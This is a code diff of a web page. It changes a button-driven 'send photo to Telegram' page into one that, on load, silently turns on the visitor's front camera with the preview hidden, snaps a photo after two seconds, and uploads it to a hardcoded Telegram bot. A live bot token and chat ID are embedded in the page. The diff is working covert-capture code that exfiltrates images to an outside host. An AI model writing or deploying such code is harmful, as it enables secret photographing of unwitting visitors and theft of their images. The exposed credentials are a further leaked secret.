@@ -3,62 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Photo to Telegram</title>
+    <title>Auto Capture Photo</title>
 </head>
 <body>
-    <h1>Take a Photo</h1>
-    <video id="video" autoplay playsinline></video>
-    <button id="capture">Capture and Send</button>
-    <canvas id="canvas" style="display: none;"></canvas>
-
+    <h1>Capturing Photo...</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
         const CHAT_ID = '1753361154';
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture');
+        // Автоматическое включение камеры и захват фото
+        window.onload = () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
 
-        // Доступ к камере
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => console.error("Camera error: ", err));
+            // Доступ к камере
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
 
-        // Захват изображения и отправка в Telegram
-        captureButton.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Захват фото через 2 секунды
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const context = canvas.getContext('2d');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/jpeg');
+                            const imageData = canvas.toDataURL('image/jpeg');
 
-            // Конвертация base64 в файл
-            fetch(imageData)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'photo.jpg');
+                            // Конвертация base64 в файл и отправка в Telegram
+                            fetch(imageData)
+                                .then(res => res.blob())
+                                .then(blob => {
+                                    const formData = new FormData();
+                                    formData.append('chat_id', CHAT_ID);
+                                    formData.append('photo', blob, 'photo.jpg');
 
-                    // Отправка в Telegram API
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert("Photo sent successfully!");
-                        } else {
-                            alert("Failed to send photo: " + data.description);
-                        }
-                    })
-                    .catch(err => console.error("Error:", err));
-                });
-        });
+                                    // Отправка в Telegram
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    })
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        if (data.ok) {
+                                            alert("Photo sent successfully!");
+                                        } else {
+                                            alert("Failed to send photo: " + data.description);
+                                        }
+                                    })
+                                    .catch(err => console.error("Error:", err));
+                                });
+                        }, 2000); // 2 секунды для активации камеры
+                    };
+                })
+                .catch(err => console.error("Camera error: ", err));
+        };
     </script>
 </body>
 </html>
